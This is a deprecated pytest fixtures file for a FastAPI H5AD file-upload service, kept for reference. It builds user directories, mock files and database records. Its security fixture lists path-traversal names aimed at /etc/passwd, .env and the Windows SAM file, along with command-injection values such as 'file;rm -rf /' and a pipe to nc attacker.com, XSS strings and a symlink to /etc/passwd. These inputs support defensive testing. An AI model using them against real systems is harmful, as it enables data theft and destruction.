"""
DEPRECATED: This file is no longer used.

All fixtures have been integrated into tests/conftest.py for automatic discovery.
This file is kept for reference only and will be removed in a future cleanup.

Date Deprecated: 2025-10-29
Reason: Pytest automatically discovers fixtures in conftest.py, making this separate
        fixtures module unnecessary. All 15 file-specific fixtures are now available
        automatically to all test files.

For current fixtures, see: tests/conftest.py (lines 630-1191)
"""

# ==============================================================================
# ORIGINAL DOCSTRING (for reference)
# ==============================================================================
"""
File-specific pytest fixtures for Phase 3.3 - File API integration tests.

This module provides specialized fixtures for:
- File upload testing (mock H5AD files, UploadFile objects)
- File directory management (temporary user directories)
- Security testing (malicious filenames, path traversal)
- H5AD data mocking (scanpy operations)
"""
import os
import pytest
import shutil
import tempfile
from io import BytesIO
from typing import Callable, List
from unittest.mock import MagicMock
from fastapi import UploadFile
from sqlalchemy.orm import Session

import numpy as np
import pandas as pd

from app.database import models


# ==============================================================================
# File Directory Fixtures
# ==============================================================================

@pytest.fixture
def temp_user_file_directory(sample_user: models.User):
    """
    Create temporary user file directory structure.
    Auto-cleanup after test.

    Structure:
        ./user/{username}/
            data/
            result/

    Args:
        sample_user: User for directory creation

    Yields:
        dict: Directory paths
            - user_dir: Root user directory
            - data_dir: Data subdirectory
            - result_dir: Result subdirectory
    """
    user_dir = f"./user/{sample_user.username}"
    data_dir = f"{user_dir}/data"
    result_dir = f"{user_dir}/result"

    os.makedirs(data_dir, exist_ok=True)
    os.makedirs(result_dir, exist_ok=True)

    yield {
        "user_dir": user_dir,
        "data_dir": data_dir,
        "result_dir": result_dir
    }

    # Cleanup
    if os.path.exists(user_dir):
        shutil.rmtree(user_dir, ignore_errors=True)


@pytest.fixture
def temp_tutorials_directory():
    """
    Create temporary tutorials directory for testing public file access.
    Auto-cleanup after test.

    Yields:
        str: Path to tutorials directory
    """
    tutorials_dir = "./tutorials"
    os.makedirs(tutorials_dir, exist_ok=True)

    yield tutorials_dir

    # Cleanup
    if os.path.exists(tutorials_dir):
        shutil.rmtree(tutorials_dir, ignore_errors=True)


# ==============================================================================
# Mock H5AD File Fixtures
# ==============================================================================

@pytest.fixture
def mock_h5ad_file(temp_user_file_directory):
    """
    Create mock H5AD file for testing using real anndata structure.
    Uses scanpy to generate valid H5AD format.

    Args:
        temp_user_file_directory: User directory paths

    Yields:
        dict: H5AD file information
            - filename: File name (test_data.h5ad)
            - filepath: Full path to file
            - adata: AnnData object (for validation)
            - n_obs: Number of observations (cells)
            - n_vars: Number of variables (genes)
    """
    try:
        import anndata as ad
    except ImportError:
        pytest.skip("anndata not installed")

    # Create mock anndata object
    n_obs = 100
    n_vars = 50

    X = np.random.rand(n_obs, n_vars)
    obs = pd.DataFrame({
        'cell_type': np.random.choice(['TypeA', 'TypeB', 'TypeC'], n_obs),
        'cluster': np.random.choice(['Cluster1', 'Cluster2'], n_obs),
        'pseudotime': np.random.rand(n_obs)
    })
    var = pd.DataFrame(index=[f'Gene{i}' for i in range(n_vars)])

    adata = ad.AnnData(X=X, obs=obs, var=var)

    # Add UMAP coordinates
    adata.obsm['X_umap'] = np.random.rand(n_obs, 2)

    # Save to file
    filename = "test_data.h5ad"
    filepath = os.path.join(temp_user_file_directory["data_dir"], filename)
    adata.write_h5ad(filepath)

    yield {
        "filename": filename,
        "filepath": filepath,
        "adata": adata,
        "n_obs": n_obs,
        "n_vars": n_vars
    }


@pytest.fixture
def mock_h5ad_file_large(temp_user_file_directory):
    """
    Create large mock H5AD file for performance testing.

    Args:
        temp_user_file_directory: User directory paths

    Yields:
        dict: Large H5AD file information (10,000 cells x 2,000 genes)
    """
    try:
        import anndata as ad
    except ImportError:
        pytest.skip("anndata not installed")

    # Create large dataset
    n_obs = 10000
    n_vars = 2000

    X = np.random.rand(n_obs, n_vars).astype(np.float32)
    obs = pd.DataFrame({
        'cell_type': np.random.choice(['TypeA', 'TypeB', 'TypeC', 'TypeD'], n_obs),
        'cluster': np.random.choice([f'Cluster{i}' for i in range(10)], n_obs),
        'pseudotime': np.random.rand(n_obs)
    })
    var = pd.DataFrame(index=[f'Gene{i}' for i in range(n_vars)])

    adata = ad.AnnData(X=X, obs=obs, var=var)
    adata.obsm['X_umap'] = np.random.rand(n_obs, 2)

    filename = "large_data.h5ad"
    filepath = os.path.join(temp_user_file_directory["data_dir"], filename)
    adata.write_h5ad(filepath)

    yield {
        "filename": filename,
        "filepath": filepath,
        "n_obs": n_obs,
        "n_vars": n_vars
    }


# ==============================================================================
# UploadFile Factory Fixtures
# ==============================================================================

@pytest.fixture
def upload_file_factory() -> Callable:
    """
    Factory for creating mock UploadFile objects.

    Returns:
        Callable: Factory function that creates UploadFile instances

    Example:
        upload_file = upload_file_factory(
            filename="test.h5ad",
            content=b"mock_h5ad_data",
            content_type="application/octet-stream"
        )
    """
    def create_upload_file(
        filename: str,
        content: bytes,
        content_type: str = "application/octet-stream"
    ) -> UploadFile:
        """
        Create a mock UploadFile object.

        Args:
            filename: Name of the file
            content: Binary content
            content_type: MIME type

        Returns:
            UploadFile: FastAPI UploadFile instance
        """
        file_obj = BytesIO(content)
        file_obj.seek(0)  # Reset to beginning

        return UploadFile(
            filename=filename,
            file=file_obj,
            content_type=content_type
        )

    return create_upload_file


@pytest.fixture
def mock_upload_files(upload_file_factory) -> List[UploadFile]:
    """
    Create multiple mock UploadFile objects for batch upload testing.

    Args:
        upload_file_factory: Factory for creating UploadFile objects

    Returns:
        List[UploadFile]: List of 3 mock upload files
    """
    files = [
        upload_file_factory(
            filename="folder1_file1.h5ad",
            content=b"mock_h5ad_data_1" * 100,  # ~1.5KB
            content_type="application/octet-stream"
        ),
        upload_file_factory(
            filename="folder2_file2.h5ad",
            content=b"mock_h5ad_data_2" * 100,
            content_type="application/octet-stream"
        ),
        upload_file_factory(
            filename="folder3_file3.h5ad",
            content=b"mock_h5ad_data_3" * 100,
            content_type="application/octet-stream"
        )
    ]
    return files


@pytest.fixture
def mock_large_upload_file(upload_file_factory) -> UploadFile:
    """
    Create mock large file for size limit testing.

    Args:
        upload_file_factory: Factory for creating UploadFile objects

    Returns:
        UploadFile: Large file (10MB)
    """
    # Create 10MB file
    large_content = b"X" * (10 * 1024 * 1024)

    return upload_file_factory(
        filename="large_file.h5ad",
        content=large_content,
        content_type="application/octet-stream"
    )


# ==============================================================================
# Security Testing Fixtures
# ==============================================================================

@pytest.fixture
def malicious_filenames() -> List[str]:
    """
    Provide list of malicious filenames for path traversal testing.

    Returns:
        List[str]: Malicious filename patterns
    """
    return [
        # Path traversal attacks
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../backend/.env",
        "../other_user/secret.h5ad",
        "../../../../proc/self/environ",

        # URL-encoded path traversal attacks
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # ../../../etc/passwd
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32",  # ..\..\..
        "..%2F..%2F..%2Fetc%2Fpasswd",  # Mixed encoding
        "..%5C..%5C..%5Cwindows%5Csystem32",  # Windows mixed encoding

        # Injection attacks
        "file;rm -rf /",
        "file && cat /etc/passwd",
        "file | nc attacker.com 1234",
        "file`whoami`.h5ad",

        # XSS/Script injection
        "file<script>alert('xss')</script>.h5ad",
        "file'><img src=x onerror=alert(1)>.h5ad",

        # Null byte injection
        "file\x00.h5ad",
        "file.h5ad\x00.exe",

        # Extremely long filename
        "very_long_" + "a" * 500 + ".h5ad",

        # Unicode/Special characters
        "数据文件.h5ad",
        "файл.h5ad",
        "file\n\r\t.h5ad"
    ]


@pytest.fixture
def symlink_attack_setup(temp_user_file_directory):
    """
    Create symlink pointing outside user directory for security testing.

    Args:
        temp_user_file_directory: User directory paths

    Yields:
        dict: Symlink information
            - symlink_path: Path to symlink
            - target_path: Path symlink points to (/etc/passwd)
    """
    # Create symlink to /etc/passwd
    symlink_path = os.path.join(
        temp_user_file_directory["data_dir"],
        "symlink_file.h5ad"
    )
    target_path = "/etc/passwd"

    try:
        os.symlink(target_path, symlink_path)
    except (OSError, NotImplementedError):
        pytest.skip("Symlink creation not supported on this platform")

    yield {
        "symlink_path": symlink_path,
        "target_path": target_path,
        "symlink_filename": "symlink_file.h5ad"
    }

    # Cleanup
    if os.path.islink(symlink_path):
        os.unlink(symlink_path)


# ==============================================================================
# Database File Record Fixtures
# ==============================================================================

@pytest.fixture
def sample_file_metadata(db_session: Session, sample_user: models.User) -> models.File:
    """
    Create sample file metadata in database.

    Args:
        db_session: Database session
        sample_user: User who owns the file

    Returns:
        models.File: File record with metadata
    """
    file_record = models.File(
        file_name="test_data.h5ad",
        file_path="./user/testuser/data",
        file_size="1048576",  # 1MB
        folder="test_folder",
        user_id=sample_user.id
    )
    db_session.add(file_record)
    db_session.commit()
    db_session.refresh(file_record)
    return file_record


@pytest.fixture
def multiple_file_metadata(db_session: Session, sample_user: models.User) -> List[models.File]:
    """
    Create multiple file metadata records for testing list operations.

    Args:
        db_session: Database session
        sample_user: User who owns the files

    Returns:
        List[models.File]: List of 5 file records across 3 folders
    """
    files = []

    # Folder 1: 2 files
    for i in range(2):
        file_record = models.File(
            file_name=f"folder1_data{i}.h5ad",
            file_path=f"./user/{sample_user.username}/data",
            file_size=str(1024 * (i + 1)),
            folder="folder1",
            user_id=sample_user.id
        )
        db_session.add(file_record)
        files.append(file_record)

    # Folder 2: 2 files
    for i in range(2):
        file_record = models.File(
            file_name=f"folder2_data{i}.h5ad",
            file_path=f"./user/{sample_user.username}/data",
            file_size=str(2048 * (i + 1)),
            folder="folder2",
            user_id=sample_user.id
        )
        db_session.add(file_record)
        files.append(file_record)

    # Folder 3: 1 file
    file_record = models.File(
        file_name="folder3_data.h5ad",
        file_path=f"./user/{sample_user.username}/data",
        file_size="4096",
        folder="folder3",
        user_id=sample_user.id
    )
    db_session.add(file_record)
    files.append(file_record)

    db_session.commit()

    for file_record in files:
        db_session.refresh(file_record)

    return files


# ==============================================================================
# Scanpy Mock Fixtures
# ==============================================================================

@pytest.fixture
def mock_scanpy_operations(monkeypatch):
    """
    Mock scanpy operations to avoid actual H5AD processing.
    Speeds up tests that don't need real H5AD data.

    Args:
        monkeypatch: Pytest monkeypatch fixture

    Yields:
        MagicMock: Mocked scanpy module
    """
    try:
        import scanpy as sc
    except ImportError:
        pytest.skip("scanpy not installed")

    # Create mock AnnData object
    mock_adata = MagicMock()
    mock_adata.obs = pd.DataFrame({
        'cluster': ['A', 'B', 'C', 'A', 'B'],
        'cell_type': ['Type1', 'Type2', 'Type1', 'Type2', 'Type1'],
        'pseudotime': [0.1, 0.2, 0.3, 0.4, 0.5]
    })
    mock_adata.obsm = {'X_umap': np.array([[1, 2], [3, 4], [5, 6], [7, 8], [9, 10]])}
    mock_adata.var = pd.DataFrame(index=['Gene1', 'Gene2', 'Gene3'])
    mock_adata.to_df.return_value = pd.DataFrame(np.random.rand(5, 3))

    # Mock scanpy.read_h5ad
    def mock_read_h5ad(filepath):
        return mock_adata

    monkeypatch.setattr(sc, 'read_h5ad', mock_read_h5ad)

    yield mock_adata


# ==============================================================================
# File Content Fixtures
# ==============================================================================

@pytest.fixture
def sample_json_setup_file(temp_user_file_directory) -> dict:
    """
    Create sample JSON setup file for testing /setup endpoints.

    Args:
        temp_user_file_directory: User directory paths

    Returns:
        dict: Setup file information
            - filename: File name
            - filepath: Full path
            - content: JSON content
    """
    import json

    setup_data = {
        "algorithm": "TENET",
        "parameters": {
            "fdr_threshold": 0.05,
            "top_genes": 100
        },
        "input_files": ["data.h5ad"],
        "output_format": "csv"
    }

    filename = "setup_config.json"
    filepath = os.path.join(temp_user_file_directory["data_dir"], filename)

    with open(filepath, 'w') as f:
        json.dump(setup_data, f)

    return {
        "filename": filename,
        "filepath": filepath,
        "content": setup_data
    }


@pytest.fixture
def sample_csv_result_file(temp_user_file_directory) -> dict:
    """
    Create sample CSV result file for testing /result endpoints.

    Args:
        temp_user_file_directory: User directory paths

    Returns:
        dict: Result file information
    """
    result_data = pd.DataFrame({
        'gene': ['Gene1', 'Gene2', 'Gene3'],
        'score': [0.95, 0.87, 0.76],
        'pvalue': [0.001, 0.01, 0.05]
    })

    filename = "option1_test_data_result.csv"
    filepath = os.path.join(temp_user_file_directory["result_dir"], filename)

    result_data.to_csv(filepath, index=False)

    return {
        "filename": filename,
        "filepath": filepath,
        "content": result_data
    }


@pytest.fixture
def sample_html_tutorial_file(temp_tutorials_directory) -> dict:
    """
    Create sample HTML tutorial file for testing /html endpoint.

    Args:
        temp_tutorials_directory: Tutorials directory path

    Returns:
        dict: Tutorial file information
    """
    html_content = """
    <!DOCTYPE html>
    <html>
    <head><title>Test Tutorial</title></head>
    <body>
        <h1>CellCraft Tutorial</h1>
        <p>This is a test tutorial.</p>
    </body>
    </html>
    """

    filename = "tutorial_test.html"
    filepath = os.path.join(temp_tutorials_directory, filename)

    with open(filepath, 'w') as f:
        f.write(html_content)

    return {
        "filename": filename,
        "filepath": filepath,
        "content": html_content
    }
